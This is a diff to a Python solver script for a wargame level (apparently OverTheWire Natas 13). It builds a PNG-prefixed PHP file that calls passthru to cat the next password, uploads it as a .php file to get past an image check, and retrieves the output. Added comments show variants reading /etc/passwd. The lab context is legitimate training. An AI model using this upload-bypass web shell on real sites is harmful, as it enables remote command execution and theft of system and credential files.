@@ -8,10 +8,18 @@ with open("natas13_upload.png", "wb") as f:
     f.write(PNG)
     f.write(
         f'<?php print passthru("cat {Auther.authPathOnServer(14)}"); ?>'.encode())
+    # f'<?php print passthru("cat /etc/passwd"); ?>'.encode())
+
+    # f'<?php print passthru("php --version"); ?>'.encode())
+    # This will get
+    # PHP 7.4.33 (cli) (built: Jul  3 2025 16:41:49) ( NTS )
+    # Copyright (c) The PHP Group
+    # Zend Engine v3.4.0, Copyright (c) Zend Technologies
+    #     with Zend OPcache v7.4.33, Copyright (c), by Zend Technologies
 
 
 def findFileName(text: str):
-    pattern = re.compile('<a href="(.*)">.*has been uploaded')
+    pattern = re.compile(r'<a href="(.*)">.*has been uploaded')
     return next((m[1] for line in text.splitlines() if (m := pattern.search(line))), None)
 
 
@@ -21,7 +29,9 @@ with open("natas13_upload.png", "rb") as f:
         "filename": "FOO.php"
     }, files={
         "uploadedfile": f
-    }).text
-    if name := findFileName(response):
-        Auther.passwordLineGetter(Auther.request(13, name, "GET").text, 14)()
+    })
+    if name := findFileName(response.text):
+        r = Auther.request(13, name, "GET").text
+        # print(r)
+        Auther.passwordLineGetter(r, 14)()
 os.remove("natas13_upload.png")
